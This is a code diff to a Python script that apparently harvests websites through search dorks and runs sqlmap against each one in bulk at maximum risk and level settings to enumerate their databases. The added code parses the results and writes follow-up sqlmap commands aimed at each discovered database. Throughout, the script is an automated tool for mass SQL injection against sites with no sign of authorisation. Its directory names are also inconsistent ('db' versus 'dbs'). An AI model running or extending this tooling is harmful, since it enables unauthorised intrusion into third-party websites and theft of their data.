@@ -25,7 +25,7 @@ yellowFont='\033[93m' #testsites color
 greenFont='\033[92m' #exploit color
 endFont = '\033[0m' # end color
 #CONFIGURATION FILES
-sqlMapPath="../sqlmap/"
+sqlMapPath=".."
 priorityFile="sqlVulnerable.txt"
 priorityFileLock=False
 errorFile="maybeVulnerable.txt"
@@ -432,24 +432,43 @@ def testIfBan(liste,site,banningFileLock):
 def filter():
 	files=os.listdir("finished")
 	for file in files:
+		dbList=[]
 		if file[0]!=".":
 			print("Checking file "+file,end="")
 			f=open("finished/"+file, "r")
 			found=False
-			for line in f.readlines():
+			lines=f.readlines()
+			if(len(lines)>1):
+				site=lines[0]
+				if(site[-1]=="\n"):
+					site=site[:-1]
+				lines=lines[1:]
+			for line in lines:
+				if line.find("[*] ")!=-1 and line.find("[*] ending")==-1 and line.find("[*] starting")==-1 :
+					dbList.append(line.replace('\n','')[line.find("[*] ")+4:])
 				if line.find("fetched data logged")!=-1:
 					found=True
-					break
 			if found==False:
 				os.remove("finished/"+file)
 				print("\n")
 				listOfRemoved=getSites(banningFile, banningFileLock)
 
 				if(testIfBan(listOfRemoved,file[:-7]+"\n",banningFileLock)):
-					appendSiteOnFile(file[:-7], bannedKeywordsFile, bannedKeywordsFileLock)
+					appendSiteOnFile(file[:-7]+"\n", bannedKeywordsFile, bannedKeywordsFileLock)
 
 			else:
-				print("Found \n")
+				if(len(dbList)>0):
+					print(" Found db\n")
+					with open("db/"+file, "w+") as result:
+						result.write(site+"\n")
+						for db in dbList:
+							result.write("python "+sqlMapPath+"/sqlmap/sqlmap.py -u %s --risk 3 --level 5 --batch -D "%(site,)+db+"\n")
+						result.close()
+					os.remove("finished/"+file)
+				else:
+					print(" Found but not db\n")
+					os.rename("finished/"+file,"maybe/"+file)
+				
 			f.close()
 def getSite(fileName,lock):
 
@@ -528,6 +547,8 @@ def exploit(maxthreads):
 
 	os.system("mkdir working")
 	os.system("mkdir finished")
+	os.system("mkdir dbs")
+	os.system("mkdir maybe")
 	while(priorityFileNumber==0 and errorFileNumber == 0):
 		print(greenFont+"Waiting for sites to come\n"+endFont)
 		time.sleep(60)
@@ -566,7 +587,7 @@ def exploit(maxthreads):
 			randomInt1=randint(0, 9)
 			randomInt2=randint(0, 9)
 			print(greenFont+"executing exploit for "+siteFile+"\n"+endFont)
-			command=' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site,siteFile,str(randomInt1)+str(randomInt2),sqlMapPath,site,siteFile,str(randomInt1)+str(randomInt2),siteFile,str(randomInt1)+str(randomInt2),siteFile,str(randomInt1)+str(randomInt2))
+			command=' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site,siteFile,str(randomInt1)+str(randomInt2),sqlMapPath+"/sqlmap/",site,siteFile,str(randomInt1)+str(randomInt2),siteFile,str(randomInt1)+str(randomInt2),siteFile,str(randomInt1)+str(randomInt2))
 			os.system(command)
 			while(priorityFileNumber==0 and errorFileNumber == 0):
 				print(greenFont+"Waiting for sites to come\n"+endFont)
@@ -616,8 +637,10 @@ def gets():
 	print("End get dorks")
 def clean():
 	os.system("rm *.txt")
-	os.system("rm -rf working finished")
+	os.system("rm -rf working finished dbs maybe")
 def setup():
+	os.mkdir("db")
+	os.mkdir("maybe")
 	os.system("export PATH=$PATH:"+firefoxDriver)
 	os.system("touch "+priorityFile+" "+errorFile+" "+sitesFile+" "+dorkListFile+ " "+bannedKeywordsFile+" "+recursiveSitesFile+" "+banningFile)
 	#os.system("echo \"google.\" > "+bannedKeywordsFile)
